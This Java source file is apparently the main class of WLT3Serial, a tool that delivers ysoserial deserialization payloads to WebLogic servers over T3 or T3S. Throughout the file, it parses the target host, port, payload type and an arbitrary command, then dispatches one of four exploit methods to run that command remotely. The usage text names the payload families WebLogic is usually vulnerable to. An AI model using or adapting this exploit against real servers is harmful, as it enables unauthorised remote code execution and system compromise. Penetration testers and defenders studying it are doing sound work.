/*
	WLT3Serial.java
	
	v0.4 (XX/XX/2018)
	
	Main class for executing java deserialization exploit against WebLogic Servers hosting a T3 or T3S listener. Parses command options, configures JVM SSL/TLS settings (if T3S
	connection will be used), then executes exploit with set options.
*/

package bort.millipede.wlt3;

import java.util.Collections;
import java.util.List;
import java.util.ArrayList;

//third-party includes
import ysoserial.Strings;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;

public class WLT3Serial {
	public static void main(String[] args) {
		System.out.print("\n"); //to make output slightly easier to read
		
		if(args.length<4) { //check number of arguments, print Usage if short
			usage();
			return;
		}
		
		//set required options
		String host = args[args.length-4];
		int port = -1;
		try {
			port = Integer.parseInt(args[args.length-3]);
		} catch(NumberFormatException nfe) {
			System.err.println("Error: Invalid port "+args[args.length-3]+"!");
			return;
		}
		if(port<0 || port>65535) {
			System.err.println("Error: Invalid port "+args[args.length-3]+"!");
			return;
		}
		String payloadType = args[args.length-2];
		String command = args[args.length-1];
		boolean t3s = false;
		String method = "Property";
		boolean verbose = false;
		
		//parse options from command-line
		if(args.length>4) {
			int lastOpt = args.length-5;
			boolean methSet = false; //if exploit method has been set
			boolean tlsSet = false; //if T3S flag has been set
			for(int i=0;i<=lastOpt;i++) {
				String opt = args[i];
				opt = opt.trim();
				if(opt.length()!=0 && opt.length()>=2) {
					switch(opt) {
						default: //invalid argument
							System.err.println("Error: Invalid option \""+opt+"\"\n");
							usage();
							return;
						case "--help": //print usage
							usage();
							return;
						case "--verbose": //enable verbose output
							verbose=true;
							break;
						case "--method=Property": //set "Connect Property Value" exploit method
							if(!methSet) {
								method = "Property";
								methSet = true;
							} else {
								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
								usage();
								return;
							}
							break;
						case "--method=Bind": //set "Bind object" exploit method
							if(!methSet) {
								method = "Bind";
								methSet = true;
							} else {
								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
								usage();
								return;
							}
							break;
						case "--method=WLBind": //set "WebLogic RMI Bind object" exploit method
							if(!methSet) {
								method = "WLBind";
								methSet = true;
							} else {
								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
								usage();
								return;
							}
							break;
						case "--method=CustomClass": //set "Custom ClassTableEntry Class" exploit method
							if(!methSet) {
								method = "CustomClass";
								methSet = true;
							} else {
								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
								usage();
								return;
							}
							break;
						case "--t3s=TLSv1.2": //use T3S to connect with TLSv1.2
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","TLSv1.2");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
						case "--t3s=TLSv1.1": //use T3S to connect with TLSv1.1
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","TLSv1.1");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
						case "--t3s": //use T3S to connect (with TLSv1)
						case "--t3s=TLSv1": //use T3S to connect with TLSv1
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","TLSv1");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
						case "--t3s=SSLv3": //use T3S to connect with SSLv3
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","SSLv3");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
						case "--t3s=SSLv2": //use T3S to connect with SSLv2Hello, falling back to SSLv3 after handshake
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","SSLv2Hello,SSLv3");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
					}
				} else {
					System.err.println("Error: Invalid option \""+opt+"\"\n");
					return;
				}
			}
		}
		
		//check if correct weblogic.rjvm.ClassTableEntry class (default or custom) is loaded into JVM for chosen exploitaton method
		switch(method) {
			case "Property":
			case "Bind":
			case "WLBind":
				if(WLT3SerialHelper.isCTECustom()) {
					System.err.print("Error: wrong weblogic.rjvm.ClassTableEntry class loaded! ");
					System.err.print("Re-run WLT3Serial with different classpath argument (wlthint3client.jar should be specified before WLT3Serial.jar)!\n");
					return;
				}
				break;
			case "CustomClass":
				if(!WLT3SerialHelper.isCTECustom()) {
					System.err.print("Error: wrong weblogic.rjvm.ClassTableEntry class loaded! ");
					System.err.print("Re-run WLT3Serial with different classpath argument (WLT3Serial.jar should be specified before wlthint3client.jar)!\n");
					return;
				}
				break;
		}
		
		try {		
			//check validity of inputted ysoserial payload type, and generate ysoserial payload
			final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
			if(payloadClass == null) {
				System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial.jar file is in classpath, and check Usage (--help option) for available payload types!");
				return;
			}
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			
			//set desired SSL/TLS protocol(s) (if using T3S) and display connection information			
			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port));
			if(t3s) {
				WLT3SerialHelper.setSSLTLSProtocol();
				String encProt = System.getProperty("jdk.tls.client.protocols");
				System.out.print(" (with ");
				if(encProt.contains("SSLv2Hello")) {
					System.out.print("SSLv2Hello handshake and SSLv3)");
				} else {
					System.out.print(encProt);
				}
				System.out.print(")");
			}
			System.out.print(": ... ");
			
			//run exploit
			switch(method) {
				case "Property":
					ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
					break;
				case "Bind":
					ContextExploit.runBindExploit(object,host,port,t3s,verbose);
					break;
				case "WLBind":
					WLNamingExploit.runWLBindExploit(object,host,port,t3s,verbose);
					break;
				case "CustomClass":
					System.setProperty("bort.millipede.wlt3.type",payloadType);
					System.setProperty("bort.millipede.wlt3.command",command);
					CustomClassTableEntryExploit.runCustomClassExploit(host,port,t3s,verbose);
					break;
			}
		} catch(NoClassDefFoundError ncdfe) {
			String message = ncdfe.getMessage();
			if(message.contains("ysoserial")) {
				System.err.println("Error loading ysoserial library! Ensure that ysoserial.jar file is in classpath, and check Usage (--help option) for available payload types!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			} else if(message.contains("weblogic")) {
				System.out.println("\b\b\b\bfailed!");
				System.err.println("Error loading wlthint3client! Ensure that wlthint3client.jar file is in classpath!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			}
			
			if(verbose) {
				System.err.print("\n");
				ncdfe.printStackTrace();
			}
		} catch(Exception e) {
			System.err.println("Unknown Error Occurred ("+e.getClass().getName()+")"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				e.printStackTrace();
			}
		}
	}
	
	//print Usage information
	private static void usage() {
		System.err.println("Usage: WLT3Serial [OPTIONS] REMOTE_HOST REMOTE_PORT PAYLOAD_TYPE PAYLOAD_CMD");
		System.err.println("\nOptions:");
		System.err.println("\t--help\t\t\t\tprint usage (you\'re lookin at it)\n");
		System.err.println("\t--verbose\t\t\tVerbose output (full thrown exception output)\n");
		System.err.println("\t--method=EXPLOIT_METHOD\t\tExploit Method for delivering generated ysoserial payload");
		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, via javax.naming.Context.lookup(), variation of ysoserial.exploit.RMIRegistryExploit)");
		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), similar to ysoserial.exploit.RMIRegistryExploit)");
		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)");
		System.err.println("\t\t\tCustomClass\tSend ysoserial payload during T3/T3S connection initialization (via custom weblogic.rjvm.ClassTableEntry class, similar to JavaUnserializeExploits weblogic.py)\n");
		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2\n\t\t\tTLSv1.1\n\t\t\tTLSv1 (Default)\n\t\t\tSSLv3");
		System.err.println("\t\t\tSSLv2 (SSLv2Hello handshake only, then fallback to SSLv3 for communication: this is an Oracle Java limitation, not a tool limitation)\n\n");
		
		//list available ysoserial payload types, or print error on failure
		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" and \"JRMPClientX\" types):");
		try {
			final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
			Collections.sort(payloadClasses, new Strings.ToStringComparator());
			for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
				System.err.println("\t"+payloadClass.getSimpleName());
			}
			System.err.println("");
		} catch(NoClassDefFoundError ncdfe) {
			System.err.println("\tNo ysoserial object payload classes found! Ensure that ysoserial jar file is in classpath when executing WLT3Serial!\n");
		} catch(Exception e) {
			System.err.println("\tUnknown Error occurred while listing ysoserial object payload classes ("+e.getClass().getName()+")!");
		}
	}
}

